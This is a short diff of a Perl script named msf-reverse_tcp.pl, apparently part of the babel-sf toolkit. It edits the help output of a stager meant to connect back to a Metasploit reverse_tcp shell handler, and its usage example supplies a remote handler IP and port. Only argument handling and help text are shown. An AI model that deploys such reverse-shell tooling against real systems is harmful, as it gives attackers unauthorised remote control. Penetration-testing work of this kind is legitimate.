@@ -12,11 +12,11 @@ use POSIX qw(strftime);
 my $date = strftime "%m-%d-%Y %H:%M", localtime;
 my $num_args = $#ARGV + 1;
 if ($num_args == 0 or $ARGV[0] eq "-h" or $ARGV[0] eq "--help" or $ARGV[0] eq "--h" or $ARGV[0] eq "-help") {
-	print"msf-reverse_tcp.pl - ( https://github.com/attackdebris/babel-sf )\n";
+	print"msf-reverse_tcp.pl ( https://github.com/attackdebris/babel-sf )\n";
 	print"[This script should be utilised with a linux/x86/shell/reverse_tcp msf handler]\n";
 	print"\nUsage:"; 
         print"\nperl msf-reverse_tcp.pl [remote handler IP] [port number]";
-	print"\nperl msf-reverse_tcp.pl e.g. perl msf-reverse_tcp.pl 8080\n";
+	print"\nperl msf-reverse_tcp.pl e.g. perl msf-reverse_tcp.pl 192.168.0.1 8080\n";
 }
 elsif ($num_args != 2) {
 	print"2 arguments are required, please check your syntax.\n";
